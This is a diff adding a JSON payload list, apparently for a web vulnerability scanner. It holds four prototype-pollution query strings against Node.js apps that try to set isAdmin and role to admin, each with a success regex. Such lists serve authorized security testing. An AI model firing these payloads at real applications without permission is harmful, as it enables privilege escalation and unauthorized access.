@@ -1,0 +1,46 @@
+[
+  {
+    "payload_id": "OWP-0713",
+    "vulnerability_category": "Injection (Prototype Pollution)",
+    "target_technology": "Node.js",
+    "injection_point": "query_parameter",
+    "payload_string": "?__proto__[isAdmin]=true",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|true"
+    }
+  },
+  {
+    "payload_id": "OWP-0714",
+    "vulnerability_category": "Injection (Prototype Pollution)",
+    "target_technology": "Node.js",
+    "injection_point": "query_parameter",
+    "payload_string": "?constructor[prototype][isAdmin]=true",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|true"
+    }
+  },
+  {
+    "payload_id": "OWP-0715",
+    "vulnerability_category": "Injection (Prototype Pollution)",
+    "target_technology": "Node.js",
+    "injection_point": "query_parameter",
+    "payload_string": "?__proto__[isAdmin]=1&__proto__[role]=admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|true"
+    }
+  },
+  {
+    "payload_id": "OWP-0716",
+    "vulnerability_category": "Injection (Prototype Pollution)",
+    "target_technology": "Node.js",
+    "injection_point": "query_parameter",
+    "payload_string": "?constructor[prototype][isAdmin]=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|true"
+    }
+  }
+]
